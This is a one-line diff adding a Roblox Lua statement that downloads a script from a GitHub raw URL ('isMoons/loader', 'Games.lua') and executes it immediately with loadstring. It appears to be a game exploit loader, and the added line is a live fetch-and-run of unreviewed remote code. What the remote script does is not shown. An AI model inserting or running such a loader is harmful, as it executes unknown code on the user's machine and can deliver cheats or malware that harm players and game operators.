@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/isMoons/loader/refs/heads/main/Games.lua"))()
